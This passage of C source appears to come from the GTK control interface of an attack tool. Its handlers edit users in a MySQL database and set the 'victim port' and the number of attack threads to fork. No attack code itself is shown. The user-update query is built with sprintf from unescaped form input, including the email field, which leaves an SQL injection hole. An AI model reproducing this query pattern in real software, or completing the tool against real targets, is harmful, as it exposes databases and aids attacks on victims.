					uid=atoi(edit_row[1]);
					role_change=atoi(edit_row[3]);
				}
			}
		}
		else
		{
			printf("error\n");
		}
		mysql_close(&edit_sql);

	}

void on_edit_user_change_ok(GtkWidget *button,gpointer data)
{
	printf("ok\n");
	MYSQL change_sql;
	MYSQL_RES *change_result;
	
  	char *e_mail=(char *)gtk_entry_get_text(GTK_ENTRY(edit_entry_email));
	char sql_query[256];	

	char *password1=(char *)gtk_entry_get_text(GTK_ENTRY(edit_entry_password));
	char *password2=(char *)gtk_entry_get_text(GTK_ENTRY(edit_entry_confirm));
	
	if(*password1=='\0')
	{
		dialog_information("Please enter a password");
		return;
	}
	if(*password2=='\0')
	{
		dialog_information("Please retype the password");
		return;
	}	

	if(!(strcmp(password1,password2)==0))
	{
		dialog_information("The password is not match\nPlease enter once again");
		gtk_entry_set_text(GTK_ENTRY(edit_entry_password),"");
		gtk_entry_set_text(GTK_ENTRY(edit_entry_confirm),"");
		return ;
	}
	char* password_crypt=(char *)crypt_password(password1);//对密码加密
	
	if(*e_mail=='\0')
	{
		dialog_information("please enter a email");
		return ;
	}	
  
      	sprintf(sql_query,"update user set password='%s',role=%d,email='%s' where id=%d",password_crypt,role_change,e_mail,uid);
	printf("sql query is %s\n",sql_query);
	
	mysql_init(&change_sql);
	if(mysql_real_connect(&change_sql,sql_address,sql_user_name,sql_password,sql_database,sql_port,sql_sock_name,sql_flag))
	{
		mysql_query(&change_sql,sql_query);
		if(mysql_affected_rows(&change_sql)==1)
		printf("change user success\n");
	 	else 
	 	printf("change new user failed\n");	
	}
	mysql_close(&change_sql);
}

void on_menu_item_edit_user_clicked(GtkWidget *button,gpointer data)
{
		
	if(role_id<0)
	{
		dialog_information("You have not longin");
		return ;
	}
	 	
	MYSQL sql;
	MYSQL_RES *res;
	MYSQL_ROW row;


	edit_builder=gtk_builder_new();
	gtk_builder_add_from_file(edit_builder,"glade/edit_user.glade",NULL);
	
	edit_dialog=GTK_WIDGET(gtk_builder_get_object(edit_builder,"edit_user"));
	edit_vbox=GTK_WIDGET(gtk_builder_get_object(edit_builder,"vbox"));
	edit_combo_box=gtk_combo_box_new_text();
	edit_entry_password=GTK_WIDGET(gtk_builder_get_object(edit_builder,"entry_password"));
	edit_entry_confirm=GTK_WIDGET(gtk_builder_get_object(edit_builder,"entry_confirm"));
	edit_combobox_role=GTK_WIDGET(gtk_builder_get_object(edit_builder,"combobox_role"));
	g_signal_connect(G_OBJECT(edit_combobox_role),"changed",G_CALLBACK(on_combo_role_changed),NULL);
	edit_entry_email=GTK_WIDGET(gtk_builder_get_object(edit_builder,"entry_email"));

	edit_user_button_ok=GTK_WIDGET(gtk_builder_get_object(edit_builder,"button_ok"));
	edit_user_button_cancle=GTK_WIDGET(gtk_builder_get_object(edit_builder,"button_cancle"));
	g_signal_connect(G_OBJECT(edit_user_button_ok),"clicked",G_CALLBACK(on_edit_user_change_ok),NULL);
	g_signal_connect_swapped(G_OBJECT(edit_user_button_cancle),"clicked",G_CALLBACK(gtk_widget_destroy),edit_dialog);
	
	
	g_signal_connect(G_OBJECT(edit_combo_box),"changed",G_CALLBACK(on_edit_user_changed),NULL);//选了别的用用户的时候，相应的信息也要变
	
	mysql_init(&sql);
	 if( mysql_real_connect(&sql,sql_address,sql_user_name,sql_password,sql_database,sql_port,sql_sock_name,sql_flag))
	{
		mysql_query(&sql,"select name from user");
		res=mysql_store_result(&sql);
		if(res)
		{
			while(row=mysql_fetch_row(res))
			{
				gtk_combo_box_append_text(GTK_COMBO_BOX(edit_combo_box),row[0]);
			}
		}
	}
	else 
	{
		printf("error when edit user\n");
	}
	mysql_close(&sql);
	gtk_combo_box_set_active(GTK_COMBO_BOX(edit_combo_box),0);
	gtk_container_add(GTK_CONTAINER(edit_vbox),edit_combo_box);


	gtk_builder_connect_signals(edit_builder,NULL);
	g_object_unref(G_OBJECT(edit_builder));
	gtk_widget_show_all(edit_dialog);	
	
}

 
/* -------------------------------------------------------------------- */
//下面都是修改攻击端口和攻击子线程的函数
int change_flag;
int user_change_number;	

void on_change_ok_clicked(GtkWidget *button,gpointer entry)
	{
		
		char *number=(char *)gtk_entry_get_text(GTK_ENTRY(entry));
		if(*number!='\0')
		{
			if(*number>='0'&&*number<='9')// 防止端口输入字母
				//victim_port=atoi(port);
				user_change_number=atoi(number);
				
			else
			{
				dialog_information("Incorrect format.Retype again");
				gtk_entry_set_text(GTK_ENTRY(entry),"");
				return;
			}
		}
		else 
		{
			dialog_information("Please input port first");
			return ;
		}
		
		if(change_flag==1)//更改攻击端口
		{       
			g_share->g_cmd.port=user_change_number;//全局变量，攻击的端口		/*Need to modify*/
                        if(user_change_number<0 ||user_change_number>65535)
			{
				dialog_information("Port number must be between 0--65535\n please retype");
				return;
			}
			printf("Victim port is %d\n",user_change_number);
			printf("Change victim port success\n");
			gtk_entry_set_text(GTK_ENTRY(entry),"");//new
		}
		if(change_flag==2)//改变thread
		{
			g_share->g_cmd.threadnumber=user_change_number;//全局变量，子线程数目		/*Need to modify*/
			if(user_change_number<0||user_change_number>CHLD_MAX)
			{
				char error[50];
				sprintf(error,"Fork child_thread must between in 1 and %d",CHLD_MAX);
				dialog_information(error);
				return;
			}
			printf("Fork child_thread is %d\n",user_change_number);
			printf("Change victim thread success\n");
		 	gtk_entry_set_text(GTK_ENTRY(entry),"");//new
		}
		
	}


void on_change_port_cancle(GtkWidget *button,gpointer entry)
	{	
		printf("cancle ok\n");		
		char *port=(char *)gtk_entry_get_text(GTK_ENTRY(entry));
		
		if(*port!='\0')
		{
			if(change_flag==1)//端口
			{
				g_share->g_cmd.port=-1;
				printf("Victim port is %d,random\n",g_share->g_cmd.port);
			}
			if(change_flag==2)//子线程				
			{
				g_share->g_cmd.threadnumber=4;
				printf("Fork child_thread to default  %d\n",g_share->g_cmd.threadnumber);
			}	
			gtk_entry_set_text(GTK_ENTRY(entry),"");
			return;
		}
		else
		{
			if(change_flag==1)
			printf("Victim port chang after is %d\n",g_share->g_cmd.port);
			if(change_flag==2)
			printf("Child_thread chang after is %d\n",g_share->g_cmd.threadnumber);
			return ;
		}

	}



void on_menu_item_change_child_thread(GtkWidget *button,gpointer data)//glade重利用 ,修改端口也是这个
{
		
	if(role_id<0)
	{
		dialog_information("You have not longin!");
		return ;
	}
	
	GtkBuilder *builder;
	GtkWidget *entry_port;
	GtkWidget *window_port;
	GtkWidget *button_ok,*button_cancle;
	GtkWidget *label_change;
	
	 change_flag=(int)data;
	
	builder=gtk_builder_new();
	gtk_builder_add_from_file(builder,"glade/chang_victim_port.glade",NULL);

	window_port=GTK_WIDGET(gtk_builder_get_object(builder,"dialog_port"));
	entry_port=GTK_WIDGET(gtk_builder_get_object(builder,"entry_change_victim_port"));
	label_change=GTK_WIDGET(gtk_builder_get_object(builder,"label1"));
	
	if((int)data==1)
	{
		gtk_label_set_text(GTK_LABEL(label_change),"Please assign the port to attack");
	}
	else
	{
		gtk_label_set_text(GTK_LABEL(label_change),"Please assign the child_thread to fork");
	}

	button_ok=GTK_WIDGET(gtk_builder_get_object(builder,"button_change_victim_port_ok"));

	pass_two two;
	two.entry=entry_port;
	two.window=window_port;

	g_signal_connect(G_OBJECT(button_ok),"clicked",G_CALLBACK(on_change_ok_clicked),(gpointer)entry_port);
	
	button_cancle=GTK_WIDGET(gtk_builder_get_object(builder,"button_change_victim_port_cancle"));	     	
       g_signal_connect(G_OBJECT(button_cancle),"clicked",G_CALLBACK(on_change_port_cancle),(gpointer)entry_port);
       g_signal_connect_swapped(G_OBJECT(button_cancle),"clicked",G_CALLBACK(gtk_widget_destroy),window_port);	

	gtk_builder_connect_signals(builder,NULL);
	g_object_unref(G_OBJECT(builder));
	gtk_widget_show_all(window_port);
}

void clear_gtk_buf(GtkTextView * text_view)
{
    GtkTextBuffer *buffer;
    GtkTextIter start, end;
    buffer = gtk_text_view_get_buffer (text_view);
    gtk_text_buffer_get_bounds (buffer, &start, &end);
    gtk_text_buffer_delete (buffer, &start, &end);
}

void *main_exit(void)
{
	if(acc_thread_num>0)
	{
		kill(acc_thread_num,SIGKILL);
	}
	if(main_thread_num>0)
	{
		kill(main_thread_num,SIGKILL);
	}
	printf("Platform exit.\n");
	gtk_main_quit();
}

